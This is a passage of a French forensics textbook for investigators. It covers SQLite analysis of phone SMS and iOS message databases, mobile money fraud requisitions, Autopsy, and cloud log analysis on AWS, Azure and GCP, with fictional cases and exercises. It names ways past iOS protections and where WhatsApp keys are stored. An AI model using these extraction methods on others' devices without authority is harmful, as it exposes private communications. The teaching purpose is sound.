-- Resultat type (fraude par phishing OTP) :
-- 2026-01-15 14:22:11  670000000
--   "Votre code OTP MoMo est 847293. Ne le partagez jamais."
-- 2026-01-15 14:22:45  670000000
--   "Vous avez envoye 250000 FCFA a 677XXXXXX. Solde : 12500 FCFA"

-- Reconstituer la chronologie d'une fraude MoMo
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    CASE type
        WHEN 1 THEN 'SMS recu'
        WHEN 2 THEN 'SMS envoye'
    END AS direction,
    body
FROM sms
WHERE (body LIKE '%OTP%' OR body LIKE '%code%'
    OR body LIKE '%envoye%' OR body LIKE '%recu%')
  AND date BETWEEN
    strftime('%s','2026-01-15 14:00:00')*1000 AND
    strftime('%s','2026-01-15 15:00:00')*1000
ORDER BY date;
\end{lstlisting}
\end{boxoutils}

\begin{boxPNC}
\textbf{Réquisition aux opérateurs Mobile Money~: que demander}

La réquisition judiciaire (art.~57 \loicam{2010/012}) à MTN ou Orange
pour une fraude MoMo doit précisément demander~:
\begin{enumerate}
    \item \textbf{Historique des transactions} du numéro victime
          sur la période (30~jours recommandés + 15~jours avant)~;
    \item \textbf{Identité et photo} associées au numéro bénéficiaire
          (numéro ayant reçu les fonds)~;
    \item \textbf{Logs de connexion} à l'application ou aux services
          USSD du numéro bénéficiaire~;
    \item \textbf{Carte SIM associée}~: série SIM (ICCID) et historique
          des échanges SIM (SIM~swapping)~;
    \item \textbf{IMEI} du téléphone utilisé avec ce numéro.
\end{enumerate}
\textbf{L'IMEI est la clé~:} si le fraudeur a changé de SIM mais
gardé son téléphone, l'IMEI identifie le téléphone physique à travers
les changements de numéro.
\end{boxPNC}

% ============================================================================
\section{Forensique iOS~: Spécificités et Limitations}
\label{sec:forensique-ios}
% ============================================================================

\subsection{Architecture et contraintes forensiques}

iOS présente une architecture de sécurité qui complique significativement
la forensique par rapport à Android~:

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Mécanisme iOS} &
    \tableauHeader{Impact forensique} &
    \tableauHeader{Contournement}
}
Chiffrement hardware AES-256 & Toutes les données sont chiffrées
    sur la puce~; inaccessibles sans code PIN & Nécessite
    Cellebrite UFED ou GrayKey~; ou accès au code PIN \\
Secure Enclave & Stocke les clés de déchiffrement~;
    inaccessible même avec root &
    Impossible à contourner sans exploit spécifique \\
App Sandbox & Chaque application est isolée~;
    aucun accès inter-app sans jailbreak &
    Exploitation jailbreak (iOS 16--17) \\
Effacement après 10~erreurs & 10~tentatives PIN incorrectes
    $\to$ effacement total &
    \textbf{Ne jamais tenter le brute-force PIN manuellement} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.4 --- Contraintes forensiques iOS}\end{center}

\subsection{Sauvegarde iTunes/Finder~: extraction logique iOS}

Si le téléphone est \textbf{déverrouillé} et que l'utilisateur fait
confiance à l'ordinateur de l'investigateur~:

\begin{boxoutils}{Extraction via sauvegarde iTunes (macOS/Windows)}
\begin{lstlisting}[language=bash_forensique]
# PREREQUIS : telephone deverrouille + "Faire confiance" accepte

# macOS -- sauvegarde via Finder
# Ouvrir Finder -> iPhone -> Sauvegarder maintenant
# Emplacement : ~/Library/Application Support/MobileSync/Backup/

# Windows -- sauvegarde via iTunes
# Emplacement : %APPDATA%\Apple Computer\MobileSync\Backup\

# Extraire la sauvegarde avec iMazing (ou outil forensique)
# ou parser manuellement avec libimobiledevice :
idevicebackup2 backup /output/ios_backup/

# Parser la sauvegarde iOS avec iBackupBot ou iPhone Backup Extractor
# Structure de la sauvegarde :
# - Manifest.db (SQLite) : inventaire de tous les fichiers
# - Manifest.plist : informations de l'appareil
# - <domain>/<hash> : fichiers individuels

# Interroger le Manifest.db
sqlite3 ~/Library/Application\ Support/MobileSync/Backup/<UDID>/Manifest.db
SELECT relativePath, domain, flags, fileID
FROM Files
WHERE relativePath LIKE '%Messages%'
ORDER BY relativePath;
\end{lstlisting}
\end{boxoutils}

\subsection{Analyse des bases iOS~: Messages et iCloud}

\begin{boxoutils}{Analyse de sms.db iOS (messages iMessage et SMS)}
\begin{lstlisting}[language=bash_forensique]
-- Localiser le fichier Messages dans la sauvegarde
-- Domain : HomeDomain, relativePath : Library/SMS/sms.db

-- Extraire les messages
sqlite3 /output/ios_backup/sms.db

SELECT
    datetime(date/1000000000 + 978307200, 'unixepoch',
        'localtime') AS date_heure,
    -- iOS date = secondes depuis 01/01/2001 (pas Unix epoch)
    CASE is_from_me
        WHEN 0 THEN h.id   -- expediteur (numero)
        WHEN 1 THEN 'Moi'
    END AS expediteur,
    text AS message
FROM message m
LEFT JOIN handle h ON h.rowid = m.handle_id
ORDER BY date;

-- Attention a l'epoch iOS : +978307200 secondes (offset 2001 vs 1970)

-- Contacts iOS (AddressBook.sqlitedb)
SELECT
    ABPerson.First, ABPerson.Last,
    ABMultiValue.value AS telephone
FROM ABPerson
JOIN ABMultiValue ON ABMultiValue.record_id = ABPerson.rowid
WHERE ABMultiValue.property = 3  -- propriete telephone
ORDER BY ABPerson.Last;
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{L'epoch iOS~: piège fréquent}
iOS utilise une epoch différente de Unix~: les timestamps iOS sont
comptés \textbf{depuis le 1er~janvier~2001} (et non le
1er~janvier~1970). L'offset est de 978~307~200~secondes.
Ne pas appliquer cette conversion donne des dates situées en 1970 ---
erreur immédiatement identifiable mais qui fragilise un rapport non relu.
Pour les messages (iMessage), il faut en plus diviser par~$10^9$
(nanoseconde~$\to$ seconde).
\end{boiteRemarque}

% ============================================================================
\section{Autopsy pour la Forensique Mobile}
\label{sec:autopsy-mobile}
% ============================================================================

\termecle{Autopsy}\index{Autopsy} (Brian Carrier, Basis Technology)
intègre depuis la version~4 des modules d'analyse mobile qui automatisent
une grande partie des analyses SQLite présentées dans ce chapitre.

\begin{boxoutils}{Autopsy --- analyse d'une extraction Android}
\begin{lstlisting}[language=bash_forensique]
# Workflow Autopsy pour forensique mobile :
# 1. New Case -> Add Data Source -> Logical Files
#    -> Selectionner le repertoire d'extraction ADB

# 2. Modules a activer :
#    - Android Analyzer : parse automatiquement mmssms.db, call_log,
#      contacts, browser history
#    - EXIF Parser : extrait toutes les metadonnees GPS
#    - Keyword Search : recherche de termes (numeros, noms, montants)
#    - Communication : reconstruit les conversations

# 3. Resultats automatiques :
#    Reports -> Data Artifacts -> Text Messages
#                              -> Call Logs
#                              -> Contacts
#                              -> GPS Tracks (carte interactive)

# Limitation importante :
# Autopsy ne peut parser que ce qui est ACCESSIBLE
# (extraction /sdcard)
# Pour /data/data (root requis), il faut l'image complete du FS
# via extraction physique (Cellebrite, UFED)

# Export du rapport HTML pour le dossier judiciaire :
# Generate Report -> HTML Report
# Inclut horodatages, sources, et résumé par artefact
\end{lstlisting}
\end{boxoutils}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Limite ADB sans root~:} \texttt{adb pull /sdcard/}
          donne les médias et backups WhatsApp, mais pas les messages
          chiffrés ni les données \texttt{/data/data}. La sauvegarde
          \texttt{adb backup -all -apk} peut donner accès aux données
          applicatives selon les réglages de l'application.

    \item \textbf{SQLite = c\oe ur de l'analyse mobile~:} SMS
          (\texttt{mmssms.db}), WhatsApp (\texttt{msgstore.db}),
          appels, contacts, navigateur -- tout est en SQLite.
          Les requêtes de ce chapitre sont directement réutilisables
          en investigation.

    \item \textbf{WhatsApp~:} médias en clair sur \texttt{/sdcard/WhatsApp/Media/}~;
          messages chiffrés dans \texttt{.crypt15}. Clé dans
          \texttt{/data/data/com.whatsapp/files/key} (root requis).
          Documenter la situation dans le rapport~: ``messages non
          déchiffrés faute de clé accessible''.

    \item \textbf{EXIF GPS}~: chaque photo peut contenir des
          coordonnées GPS précises. Utiliser \texttt{exiftool -csv -GPS*}
          pour extraire en masse~; visualiser sur OpenStreetMap.

    \item \textbf{Mobile Money}~: fraudes MoMo~$\to$ toujours
          analyser \texttt{mmssms.db} (SMS OTP~; confirmations
          de transactions) ET requérir les logs opérateur
          (art.~57 Loi~2010). L'IMEI du téléphone fraudeur
          est la clé de l'identification même si la SIM a changé.

    \item \textbf{iOS~:} ne jamais tenter le brute-force PIN
          (10~erreurs~$\to$ effacement). Extraction via sauvegarde
          iTunes si téléphone déverrouillé. Attention à l'epoch
          iOS~: offset +978~307~200~secondes vs Unix.

    \item \textbf{Autopsy~:} automatise l'analyse des extractions
          Android (SMS, appels, GPS, contacts, navigateur). Limitation~:
          ne traite que ce qui est accessible (pas le \texttt{/data/data}
          sans root).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~16.1 --- Requêtes SQLite \niveaubase}]
Vous disposez de \texttt{mmssms.db} extrait du téléphone de BELLO Armand
(Opération TANGUE). Rédigez les requêtes SQLite permettant de~:
\begin{enumerate}[(a)]
    \item Lister tous les SMS reçus entre le 1\textsuperscript{er} et
          le 15~mars~2026, avec horodatage lisible et expéditeur.
    \item Extraire tous les SMS contenant les mots ``code'', ``OTP'',
          ou ``virement''.
    \item Calculer le nombre de SMS échangés avec le numéro
          \texttt{+237677XXXXXX} par jour (un résultat par jour).
    \item Identifier tous les SMS d'un expéditeur qui a envoyé
          plus de 50~messages en un seul jour (indicateur d'automatisation).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~16.2 --- Fraude MoMo \niveaumoyen}]
Dans l'affaire BAOBAB, la victime FOUDA Clément a perdu 250~000~FCFA.
L'analyse de son téléphone révèle les SMS suivants dans \texttt{mmssms.db}~:
\begin{lstlisting}[language=bash_forensique]
-- Extrait :
date_heure            expediteur    contenu
2026-01-15 14:22:11   670000000
    "Votre code OTP MoMo est 847293. Ne le partagez jamais."
2026-01-15 14:22:15   +237677000123
    "Salut. Je travaille chez MTN. Donnez-moi votre code pour
     verifier votre compte."
2026-01-15 14:22:45   670000000
    "Vous avez envoye 250000 FCFA a 677000123. Solde : 3400 FCFA"
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Qualifiez juridiquement les infractions commises (articles
          précis des Lois~2010 et~2024).
    \item Que demandez-vous dans la réquisition à MTN Cameroun~?
          Listez les 5~informations indispensables.
    \item Comment l'IMEI peut-il aider l'enquête si le fraudeur
          a changé de SIM après la fraude~?
    \item Rédigez la constatation forensique correspondante à partir
          des SMS ci-dessus, en appliquant la distinction
          constatation/interprétation.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~16.3 --- Investigation mobile complète \niveauexpert}]
Vous avez en custody le téléphone Samsung Galaxy A53 de MBONGO Joseph
(EV-002, Chapitre~\ref{chap:custody}). L'extraction ADB a produit
les données suivantes dans \texttt{/output/extraction\_EV002/}~:
\begin{itemize}
    \item \texttt{/sdcard/} (photos, téléchargements, backups WhatsApp)~;
    \item \texttt{mmssms.db}, \texttt{call\_log.db}, \texttt{contacts2.db}~;
    \item \texttt{/sdcard/WhatsApp/Databases/msgstore.db.crypt15}~;
    \item \texttt{/sdcard/WhatsApp/Media/WhatsApp Images/} (23~images).
\end{itemize}
\begin{enumerate}[(a)]
    \item Planifiez l'analyse~: dans quel ordre analyser ces sources~?
          Quelle question investigative posez-vous à chaque source~?
    \item Les messages WhatsApp sont dans \texttt{.crypt15} (chiffrés).
          Quelles sont vos options légales et techniques pour y accéder~?
          Que documentez-vous si l'accès est impossible~?
    \item \texttt{exiftool} révèle que la photo
          \texttt{IMG-20260115-WA0003.jpg} a des coordonnées GPS
          situées à 200~mètres du siège de SONATRAV~SA à 14h28.
          L'affaire principale concerne un virement frauduleux
          depuis les comptes de SONATRAV. Quelle valeur probatoire
          accordez-vous à cette photo~? Rédigez la constatation et
          l'analyse correspondantes.
    \item Rédigez la section ``Artefacts mobiles'' du rapport d'expertise,
          couvrant les 4~sources analysées, avec pour chacune~:
          méthode d'extraction, artefacts trouvés, valeur probatoire.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:anti-for} (Anti-Forensique
et Contre-Mesures) traite les techniques d'effacement et d'obfuscation
que les fraudeurs utilisent sur les téléphones~--- y compris le
factory reset, l'effacement des logs d'appels, les applications
``vault'' et les téléphones chiffrés. Ce chapitre vous apprendra
à détecter ces tentatives d'anti-forensique et à en documenter
l'existence même quand les données ont été effacées.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C17_forensique_cloud.tex
% Titre    : Forensique Cloud
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 10 (portails LEA, art. 29 Budapest, Protocole II)
%            Ch. 11 (CLOUD Act, SCA, RGPD art. 23)
%            Ch. 15 (logs, corrélation, CloudTrail mentionné)
%            Affaires WOURI (Gmail), BAOBAB (Binance), MVOM (AWS)
% Positionnement : Ch. 10-11 ont traité le cadre légal de l'accès aux
%                  données cloud (portails LEA, MLAT, CLOUD Act). Ce chapitre
%                  traite le "comment" technique : que demander, comment
%                  analyser les logs obtenus, comment structurer les preuves
%                  cloud pour le tribunal.
% ============================================================================

\chapter{Forensique Cloud}
\label{chap:for-cloud}

\epigraph{%
    « The cloud is just someone else's computer. »%
}{--- Adage des administrateurs système}

\niveauChapitre{Expert}{%
    Chapitres~\ref{chap:norm-glob} (portails LEA, Budapest),
    \ref{chap:leg-mond} (CLOUD Act, SCA, RGPD) et
    \ref{chap:for-res} (logs, corrélation) indispensables.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre les modèles de service cloud (SaaS, PaaS, IaaS)
          et leur impact sur la disponibilité des preuves forensiques.
    \item Identifier les logs disponibles sur les trois grandes
          plateformes (AWS, Azure, Google Cloud) et leur contenu
          forensique.
    \item Formuler des demandes structurées aux portails LEA des
          grands fournisseurs~; obtenir et analyser les réponses.
    \item Analyser les journaux AWS CloudTrail et Azure Activity Log
          pour reconstituer une chronologie d'attaque cloud.
    \item Gérer la tension entre éphéméralité des données cloud
          et exigences probatoires de persistance.
    \item Coordonner une investigation cloud impliquant plusieurs
          juridictions et fournisseurs.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Le problème central de la forensique cloud}
% ============================================================================

La forensique cloud pose trois défis que les investigations classiques
ne posent pas~:

\begin{enumerate}
    \item \textbf{Souveraineté diffuse}~: les données sont stockées dans
          des datacenters dont la localisation peut changer dynamiquement
          et dépend du fournisseur, pas de l'enquêteur. Qui a juridiction~?
    \item \textbf{Éphéméralité}~: les instances cloud peuvent être
          détruites en secondes, emportant toutes leurs données. La fenêtre
          d'acquisition est souvent de minutes, pas d'heures.
    \item \textbf{Multi-tenancy}~: les données de plusieurs clients
          coexistent sur la même infrastructure physique~; l'isolement
          est logique, pas physique.
\end{enumerate}

\separateur

% ============================================================================
\section{Modèles de Service et Disponibilité des Preuves}
\label{sec:modeles-cloud}
% ============================================================================

Le modèle de service détermine qui contrôle quoi --- et donc qui peut
fournir quelles preuves à la demande de l'investigateur.

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{3.0cm}p{3.5cm}}{%
    \tableauHeader{Modèle} &
    \tableauHeader{Ce que gère le client} &
    \tableauHeader{Ce que gère le fournisseur} &
    \tableauHeader{Preuves disponibles via LEA}
}
\textbf{SaaS} (Gmail, Office~365, Dropbox) &
    Ses données uniquement &
    Tout (infra, OS, appli, logs) &
    Logs de connexion, métadonnées, contenu (MLAT/warrant) \\
\textbf{PaaS} (Heroku, Google App Engine) &
    Code applicatif, données &
    Infra, OS, runtime &
    Logs plateforme + logs applicatifs si conservés \\
\textbf{IaaS} (AWS EC2, Azure VM, GCP Compute) &
    OS, appli, données, logs &
    Physique, hyperviseur &
    Logs de la couche cloud uniquement~; logs OS~= réquisition
    au client (ou saisie du compte) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.1 --- Modèles cloud et disponibilité des preuves}\end{center}

\begin{boiteRemarque}{Implication pratique~: SaaS est plus simple que IaaS}
Paradoxalement, l'investigation d'un compte Gmail (SaaS) est plus
directe qu'une instance AWS compromise (IaaS). Pour Gmail, une demande
au portail LEA Google suffit pour les métadonnées~; pour une instance
EC2, le fournisseur ne voit pas le contenu des VMs~--- il faut soit
accéder au compte AWS compromis, soit saisir légalement l'instance.
\end{boiteRemarque}

% ============================================================================
\section{Logs Cloud~: ce qui Existe et où le Trouver}
\label{sec:logs-cloud}
% ============================================================================

\subsection{AWS CloudTrail~: l'audit complet des API}

\termecle{AWS CloudTrail}\index{CloudTrail} enregistre chaque appel API
effectué sur un compte AWS~: qui a fait quoi, quand, depuis quelle IP.
C'est le journal d'audit le plus complet du cloud AWS.

\begin{boxoutils}{Analyse AWS CloudTrail}
\begin{lstlisting}[language=bash_forensique]
# CloudTrail stocke ses logs dans S3 au format JSON (gzip)
# Structure d'un log CloudTrail type :
# {
#   "eventTime": "2026-03-13T02:15:33Z",
#   "eventSource": "ec2.amazonaws.com",
#   "eventName": "DescribeInstances",
#   "userIdentity": {
#     "type": "IAMUser",
#     "userName": "admin",
#     "arn": "arn:aws:iam::123456789:user/admin"
#   },
#   "sourceIPAddress": "185.220.XX.XX",
#   "userAgent": "aws-cli/2.11.0 Python/3.11.0"
# }

# Telecharger et analyser les logs CloudTrail avec AWS CLI
aws s3 ls s3://mon-bucket-cloudtrail/AWSLogs/123456789/
aws s3 sync s3://mon-bucket-cloudtrail/ /output/cloudtrail/

# Analyser avec jq (JSON query)
# Toutes les actions depuis une IP suspecte
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.sourceIPAddress == "185.220.XX.XX") |
    [.eventTime, .eventName, .userIdentity.userName,
     .sourceIPAddress] | @csv'

# Actions de creation/suppression d'instances (indicateurs)
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.eventName | test("RunInstances|TerminateInstances|
        CreateUser|DeleteUser|AttachUserPolicy")) |
    [.eventTime, .eventName, .userIdentity.userName,
     .sourceIPAddress] | @csv'

# Verifier si CloudTrail a ete desactive (anti-forensique cloud)
cat /output/cloudtrail/*.json.gz | gunzip | \
    jq -r 'select(.eventName ==
        "StopLogging" or .eventName == "DeleteTrail") |
    [.eventTime, .eventName, .userIdentity.userName] | @csv'
# Trouver "StopLogging" dans les logs -> tentative d'anti-forensique
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{CloudTrail --- reconstitution d'une compromission AWS MVOM}
L'analyse des logs CloudTrail du compte AWS de TRANSBOIS~SA révèle
la séquence suivante~:

\begin{lstlisting}[language=bash_forensique]
# Timeline CloudTrail filtree sur 13/03/2026 02h00-03h00
02:13:45  AssumeRole       IP:185.220.XX.XX  Role:EC2-Admin
02:14:03  DescribeInstances IP:185.220.XX.XX  User:admin
02:14:11  GetConsoleOutput  IP:185.220.XX.XX  Instance:i-0a1b2c3d4e
02:16:02  RunInstances      IP:185.220.XX.XX  Type:t2.xlarge
          # Lancement d'une instance suspecte
02:17:55  PutObject         IP:185.220.XX.XX  Bucket:transbois-backup
          # Exfiltration vers S3 (45 Mo)
02:19:48  StopLogging       IP:185.220.XX.XX
          # TENTATIVE SUPPRESSION DES LOGS CloudTrail
02:19:49  [CloudTrail arrêté -- fenêtre aveugle]
02:23:11  TerminateInstances  # Instance suspecte detruite
\end{lstlisting}

\textbf{Constatation~:} L'action \texttt{StopLogging} à 02h19:49 a
interrompu la journalisation CloudTrail. Cependant, les logs antérieurs
(02h13--02h19) sont déjà enregistrés dans S3 et ne peuvent pas être
rétroactivement effacés si le bucket S3 est protégé
(\textit{Object Lock / WORM})~--- ce qui est le cas ici.
\textbf{L'anti-forensique cloud a échoué car les logs étaient
en écriture unique.}
\end{boxscenario}

\subsection{Azure Activity Log et Azure AD Sign-In Logs}

\begin{boxoutils}{Analyse Azure Activity Log et Sign-In}
\begin{lstlisting}[language=bash_forensique]
# Azure CLI -- extraire les logs d'activite
az monitor activity-log list \
    --start-time "2026-03-13T02:00:00Z" \
    --end-time "2026-03-13T03:00:00Z" \
    --output json > /output/azure_activity.json

# Analyser avec jq
cat /output/azure_activity.json | jq -r \
    '.[] | [.eventTimestamp, .operationName.value,
    .caller, .properties.statusCode] | @csv'

# Azure AD Sign-In Logs (tentatives de connexion)
# Via Azure Portal -> Azure Active Directory -> Sign-ins
# Ou via Microsoft Graph API :
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/auditLogs/signIns?\
    \$filter=createdDateTime ge 2026-03-13T02:00:00Z and
    createdDateTime le 2026-03-13T03:00:00Z" \
    > /output/azure_signins.json

cat /output/azure_signins.json | jq -r \
    '.value[] | [.createdDateTime, .userDisplayName,
    .ipAddress, .status.errorCode, .location.city] | @csv'
# errorCode 0 = succes, 50126 = mot de passe incorrect, etc.
\end{lstlisting}
\end{boxoutils}

\subsection{Google Cloud Logging~: Cloud Audit Logs}

\begin{lstlisting}[language=bash_forensique,
    caption={Google Cloud Audit Logs --- analyse forensique}]
# Google Cloud Logging via gcloud CLI
gcloud logging read \
    "timestamp >= \"2026-03-13T02:00:00Z\"
     AND timestamp <= \"2026-03-13T03:00:00Z\"
     AND protoPayload.methodName:(
        \"compute.instances.insert\"
        OR \"compute.instances.delete\"
        OR \"storage.buckets.create\")
     AND protoPayload.authenticationInfo.principalEmail != \"\"" \
    --project=mon-projet \
    --format=json > /output/gcp_audit.json

# Extraire les createurs de ressources (qui a lance quoi)
cat /output/gcp_audit.json | python3 -c "
import json, sys
for entry in json.load(sys.stdin):
    pp = entry.get('protoPayload', {})
    print(
        entry.get('timestamp',''),
        pp.get('methodName',''),
        pp.get('authenticationInfo',{}).get('principalEmail',''),
        pp.get('requestMetadata',{}).get('callerIp','')
    )
"
\end{lstlisting}

% ============================================================================
\section{Obtenir des Preuves Auprès des Fournisseurs SaaS}
\label{sec:preuve-saas}
% ============================================================================

\subsection{Structurer une demande au portail LEA}

Le Chapitre~\ref{chap:norm-glob} (Section~\ref{sec:mlat-lea}) a
présenté les portails LEA. Ce chapitre approfondit la \emph{structure}
de la demande elle-même~--- les éléments sans lesquels elle sera
systématiquement rejetée.

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Champ obligatoire} &
    \tableauHeader{Contenu requis et formulation recommandée}
}
\textbf{Type de demande} &
    Preservation Request (urgence)~; Production Request (standard)~;
    Emergency Request (menace imminente). Choisir le bon type~:
    une Production sans Preservation préalable arrive souvent après
    que les données ont été effacées. \\
\textbf{Identifiants du compte} &
    Adresse email, numéro de téléphone, URL du profil, IMEI associé.
    Toujours donner au moins deux identifiants croisés pour lever
    l'ambiguïté. \\
\textbf{Base légale} &
    Citer explicitement~: art.~52 et~57 \loicam{2010/012}~;
    Budapest art.~16--17 si l'État requis est partie~;
    SCA 18~U.S.C.~\S~2703 pour fournisseurs US. \\
\textbf{Qualification de l'infraction} &
    Description factuelle + qualification juridique des deux pays
    (double incrimination). Pour un fournisseur US~: citer le CFAA. \\
\textbf{Période visée} &
    Date de début et de fin précises. Éviter les demandes ouvertes
    (``toute la vie du compte'')~: systématiquement rejetées. \\
\textbf{Données demandées} &
    Distinguer métadonnées (abonné, connexion) et contenu~:
    les métadonnées s'obtiennent sans warrant~; le contenu nécessite
    un MLAT ou équivalent. \\
\textbf{Coordonnées de contact} &
    Nom, titre, email officiel, numéro de téléphone direct.
    Les réponses urgentes vont directement à ce contact. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.2 --- Éléments obligatoires d'une demande LEA}\end{center}

\subsection{Analyser la réponse d'un fournisseur}

\begin{boxoutils}{Traitement d'une réponse Google (métadonnées Gmail)}
\begin{lstlisting}[language=bash_forensique]
# Structure typique d'une reponse Google aux autorites
# (format JSON ou fichier texte structure)
# Exemple : reponse pour un compte Gmail suspect

# 1. Informations d'abonne (disponibles sans warrant)
{
  "accountEmail": "suspect.wouri@gmail.com",
  "googleId": "123456789012345678901",
  "accountCreated": "2025-12-28T10:15:22Z",
  "lastLoginDate": "2026-01-15T14:35:11Z",
  "recoveryEmail": "autre.compte@yahoo.fr",
  "recoveryPhone": "+23365XXXXXXX",
  "services": ["Gmail", "Google Drive", "Google Photos"]
}

# 2. Logs de connexion (disponibles sans warrant)
[
  {"loginTime": "2026-01-15T14:28:01Z",
   "ipAddress": "41.82.XXX.XXX",       # IP senegale (Sonatel)
   "loginType": "GOOGLE_LOGIN",
   "success": true},
  {"loginTime": "2026-01-15T14:35:09Z",
   "ipAddress": "41.82.XXX.XXX",
   "loginType": "GMAIL_SMTP_AUTH",
   "success": true}
]

# Croiser avec la capture reseau WOURI (Ch. 15) :
# Email SMTP envoye depuis contact@medequip-portugal.com a 14h28:03
# Connexion Gmail depuis IP senegalaise a 14h28:01
# -> le compte suspect s'est connecte 2 secondes avant l'envoi
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Valeur probatoire d'une réponse de fournisseur}

Une réponse d'un fournisseur US (Google, Meta, Microsoft) à une
demande LEA constitue un \textit{business record} au sens de la
FRE~Rule~803(6) (Chapitre~\ref{chap:leg-mond}). Elle est directement
admissible en droit américain. En droit camerounais~:
\begin{itemize}
    \item Considérée comme un document étranger authentifié~;
    \item Nécessite l'attestation d'un expert judiciaire expliquant
          le processus de génération et la fiabilité du système~;
    \item Hash SHA-256 du fichier reçu à calculer et documenter
          immédiatement (custody numérique des réponses LEA,
          cf. Ch.~\ref{chap:custody}).
\end{itemize}
\end{boxjuris}

% ============================================================================
\section{Gérer l'Éphéméralité~: Conservation d'Urgence}
\label{sec:ephemerality}
% ============================================================================

\subsection{Le problème de la rétention limitée}

Les données cloud ont des durées de vie variables selon les fournisseurs~:

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Type de donnée} &
    \tableauHeader{Durée de rétention typique} &
    \tableauHeader{Action à entreprendre}
}
Logs de connexion IP & 30--90~jours selon fournisseur &
    Demande de conservation \textbf{immédiate} via art.~29 Budapest
    ou portail LEA \\
Contenu emails supprimés & 30~jours (corbeille) puis effacé &
    Preservation Request \textbf{avant} la fin des 30~jours \\
Instances cloud éteintes & Selon configuration (souvent~: 7~jours) &
    Saisie immédiate ou snapshot forensique \\
Données Snap/Telegram & Heures à jours &
    Urgence absolue~; canal INTERPOL 24/7 \\
Transactions financières & Souvent 5--10~ans (réglementation AML) &
    Standard MLAT acceptable \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.3 --- Durées de rétention et urgence d'action}\end{center}

\subsection{Snapshot forensique d'une instance cloud}

Quand l'investigateur a accès au compte cloud compromis (ou que le
suspect est le propriétaire du compte et coopère), le snapshot est
l'équivalent cloud de l'image E01~:

\begin{boxoutils}{Snapshot forensique AWS / GCP}
\begin{lstlisting}[language=bash_forensique]
# AWS -- snapshot d'un volume EBS (disque de VM)
# PREREQUIS : acces au compte AWS (credentials)

# 1. Identifier le volume de l'instance
aws ec2 describe-instances --instance-ids i-0a1b2c3d4e \
    --query 'Reservations[].Instances[].BlockDeviceMappings[].Ebs.VolumeId'
# Resultat : vol-0xyz789abc

# 2. Creer un snapshot (image read-only du volume)
aws ec2 create-snapshot --volume-id vol-0xyz789abc \
    --description "Forensic snapshot MVOM 2026-03-13 OPJ NKENG"
# Resultat : snap-0forensic123

# 3. Copier le snapshot dans un compte forensique isole
aws ec2 copy-snapshot --source-region eu-west-1 \
    --source-snapshot-id snap-0forensic123 \
    --region eu-west-1 \
    --description "Forensic copy - case DOS-2026-034"

# 4. Calculer et documenter le hash du snapshot
# (via AWS S3 Export puis hash local)
aws ec2 export-image --snapshot-ids snap-0forensic123 \
    --s3-export-location S3Bucket=forensic-exports,S3Prefix=case-034/
# Apres export :
aws s3 cp s3://forensic-exports/case-034/snapshot.vmdk /output/
sha256sum /output/snapshot.vmdk > /output/snapshot_hash.txt

# GCP -- snapshot d'un disque Persistent Disk
gcloud compute disks snapshot DISK_NAME \
    --snapshot-names=forensic-snap-20260313 \
    --zone=europe-west1-b \
    --description="Forensic snapshot MVOM DOS-2026-034"
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Le snapshot n'est pas l'image E01}
Un snapshot cloud est une copie logique cohérente du volume à un instant t.
Il préserve le contenu mais \textbf{pas exactement les mêmes garanties
qu'un write blocker physique}~: la création du snapshot est elle-même
une opération enregistrée dans CloudTrail. Documenter obligatoirement~:
\begin{enumerate}
    \item Horodatage exact de la création du snapshot~;
    \item ID du snapshot~;
    \item Compte AWS/GCP utilisé pour le créer~;
    \item Hash SHA-256 du fichier exporté.
\end{enumerate}
\end{boiteRemarque}

% ============================================================================
\section{Investigation Multi-Fournisseurs~: Corrélation Cloud}
\label{sec:correlation-cloud}
% ============================================================================

Les affaires complexes impliquent souvent plusieurs fournisseurs cloud
simultanément. La corrélation entre leurs données est la clé pour
reconstituer l'image complète.

\begin{boxscenario}{Affaire BAOBAB --- corrélation multi-cloud}
L'Opération BAOBAB (fraudes MoMo, Chapitre~\ref{chap:norm-glob}) implique~:
\begin{itemize}
    \item Un compte Binance (exchange crypto) via lequel les fonds
          ont été convertis~;
    \item Une adresse email Yahoo utilisée pour créer le compte Binance~;
    \item Un VPN hébergé sur AWS EC2 (masquage de l'IP réelle)~;
    \item Un wallet Bitcoin avec transactions sur la blockchain.
\end{itemize}

\textbf{Séquence de demandes parallèles~:}

\begin{enumerate}
    \item \textbf{Preservation simultanée~:} portail LEA Binance +
          portail LEA Yahoo + AWS CloudTrail. \textbf{Simultané,
          pas séquentiel}~: les données se recoupent et les effacer
          l'une révèlerait l'enquête à l'autre.

